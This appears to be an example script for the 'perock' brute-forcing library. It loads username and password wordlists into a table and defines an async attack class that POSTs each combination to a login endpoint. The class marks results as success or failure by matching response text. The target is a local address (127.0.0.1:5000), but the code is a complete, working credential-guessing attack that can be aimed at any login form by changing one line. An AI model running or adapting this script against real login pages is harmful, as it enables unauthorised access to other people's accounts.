from perock import forcetable
from perock import attack
from perock import runner

import asyncio
import aiohttp

import os 

# Sets up paths needed by this file
folder_path = os.path.split(os.path.abspath(__file__))[0]
asserts_path = os.path.join(folder_path, "asserts")

usernames_file = os.path.join(asserts_path, "usernames.txt")
passwords_file = os.path.join(asserts_path, "passwords.txt")


# Create field with usernames
usernames_field = forcetable.FieldFile("usernames", usernames_file)
usernames_field.set_item_name("username")

# Create with passwords
passwords_field = forcetable.FieldFile("passwords", passwords_file)
passwords_field.set_item_name("password")

# Create table and add fields
table = forcetable.Table()
table.add_field(usernames_field)
table.add_field(passwords_field)
# Sets usernames_field as primary field of table
table.set_primary_field(usernames_field)

# table will handle cartesian product of the fields
# tabe also contains records created from the fields


class LoginPageAttackAsync(attack.AttackAsync):
    def __init__(self, target, data: dict, retries=1) -> None:
        super().__init__(target, data, retries)
        # self._responce can also be None or Exception
        # Responce can be anything but None and Exception are special.
        self._responce: aiohttp.ClientResponse
        self._session: aiohttp.ClientSession

    @classmethod
    async def create_session(cls):
        # Creates session object to use with request
        return aiohttp.ClientSession()

    async def request(self):
        if self.session_exists():
            return await self._session.post(self._target, data=self._data)
        else:
            async with self.create_session() as session:
                return await session.post(self._target, data=self._data)

    async def failure(self):
        if await self.target_reached():
            if b"Failed to login" in await self._responce.read():
                return True
            elif b"No such username" in await self._responce.read():
                return True
        return False

    async def success(self):
        if await self.target_reached():
            return b"Login successful" in await self._responce.read()
        return False

    async def target_errors(self):
        if await self.target_reached():
            return self._responce.status != 200
        return False


# Creates runner object to perform bruteforce
runner_object = runner.RunnerAsync(LoginPageAttackAsync)
runner_object.set_target('http://127.0.0.1:5000/login')
runner_object.set_table(table)

# Enables optimisation(requires primary field)
runner_object.enable_optimise()
asyncio.run(runner_object.run())